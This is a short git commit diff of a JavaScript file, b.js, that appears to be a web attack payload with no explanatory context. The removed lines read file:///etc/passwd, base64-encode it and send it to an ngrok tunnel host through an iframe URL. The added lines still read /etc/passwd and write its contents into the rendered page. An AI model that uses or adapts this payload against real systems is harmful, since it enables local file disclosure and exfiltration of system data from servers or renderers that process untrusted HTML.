003ce46515f76ea4b302262b70af0cf007e9ff98
rohmatariow <79053660+rohmatariow@users.noreply.github.com>
2021-09-01 03:17:00 +0700

    Update b.js

--- b.js
+++ b.js
@@ -1,10 +1,6 @@
-function reqListener () {
-    var encoded = encodeURI(this.responseText);
-    var b64 = btoa(this.responseText);
-    var raw = this.responseText;
-    document.write('<iframe src="http://853d-111-94-9-137.ngrok.io?data='+b64+'"></iframe>');
-} 
-var oReq = new XMLHttpRequest(); 
-oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/passwd"); 
-oReq.send();
+x=new XMLHttpRequest;
+x.onload=function(){  
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
